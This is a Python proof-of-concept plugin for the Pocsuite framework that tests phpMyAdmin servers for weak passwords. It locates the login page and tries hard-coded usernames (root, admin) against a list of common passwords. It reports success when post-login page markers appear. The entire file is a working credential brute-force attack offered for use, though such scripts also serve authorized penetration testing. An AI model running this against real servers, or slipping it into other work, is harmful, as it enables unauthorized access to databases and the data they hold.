#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = '00003'
    version = '1.0'
    author = ''
    vulDate = '2013-04-23'
    createDate = '2016-03-07'
    updateDate = '2016-03-07'
    references = ''
    name = 'phpMyAdmin 弱密码漏洞'
    appPowerLink = 'http://www.phpMyAdmin.com/'
    appName = 'phpMyAdmin'
    appVersion = 'ALL'
    vulType = 'Weak Password'
    desc = '''
    phpMyAdmin弱口令登录，从而导致攻击者可据此信息进行后续攻击。
    '''
    samples = ['']

    def _attack(self):
        return self._verify()

    def _verify(self):
        result = {}
        flag_list = ['src="navigation.php', 'frameborder="0" id="frame_content"', 'id="li_server_type">',
                     'class="disableAjax" title=']
        user_list = ['root', 'admin']
        password_list = ['root', '123456', '12345678', 'password', 'passwd', '123', 'admin', 'admin123']
        try:
            response = req.get(self.url)
            if 'name=\"phpMyAdmin\"' in response.content:
                target_url = str(self.url) + "/index.php"
            else:
                response = req.get(self.url + '/phpmyadmin/index.php')
                if 'input_password' in response.content and 'name="token"' in response.content:
                    target_url = self.url + "/phpmyadmin/index.php"
        except Exception as e:
            pass

        for user in user_list:
            for password in password_list:
                payload_data = "pma_username=" + str(user.strip()) + "&pma_password=" + str(password.strip()) + "" \
                               "&server=1&target=index.php&lang=zh_CN&collation_connection=utf8_general_ci"
                try:
                    respond = req.post(target_url, data=payload_data)
                    for flag in flag_list:
                        if flag in respond.content:
                            result['VerifyInfo'] = {}
                            result['VerifyInfo']['URL'] = target_url
                            result['VerifyInfo']['Payload'] = payload_data
                except Exception as e:
                    # print(e)
                    pass
        return self.parse_output(result)

    def parse_output(self, result):
        # parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
